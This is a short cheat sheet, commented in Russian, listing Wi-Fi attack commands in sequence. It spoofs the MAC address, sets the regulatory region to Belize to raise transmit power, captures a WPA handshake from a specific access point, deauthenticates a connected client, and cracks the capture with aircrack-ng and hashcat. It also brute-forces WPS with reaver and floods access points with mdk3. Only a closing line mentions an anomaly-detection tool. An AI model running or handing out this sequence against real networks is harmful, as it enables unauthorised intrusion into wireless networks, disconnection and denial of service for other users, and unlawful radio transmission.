# aireplay-ng -9  
# iwlist wlan0 frequency  
# ifconfig wlan0 down — выключаем интерфейс.  
# macchanger -r wlan0 — меняем MAC.  
# iw reg set BZ — выставляем регион Белиз.  
# iwconfig wlan0 txpower 30 — увеличиваем мощность.  
# ifconfig wlan0 up — поднимаем интерфейс.  
  
  
# airodump-ng wlan0mon  
# airodump-ng wlan0mon --bssid FC:8B:97:57:97:A9 --channel 2 --write handshake --wps  
# aireplay-ng -0 10 -a FC:8B:97:57:97:A9 -c 68:3E:34:15:39:9E wlan0mon  
  
# cowpatty -r handshake-01.cap -c  
# wpaclean handshake-01.cap wpacleaned.cap  
  
# aircrack-ng wpacleaned.cap –w wordlist.txt  
# oclHashcat –m 2500 –a 3 end.hccap путь к словарю - WPA/WPA2  
  
# wash -i wlan0mon –scan  
# reaver -i wlan0mon -b 00:AA:BB:11:22:33 -vv -K 1  
  
# mdk3 wlan0 a  
  
Для обнаружения аномалий беспроводного эфира в “домашних” условиях можно  
использовать утилиту waidps - https://github.com/SYWorks/waidps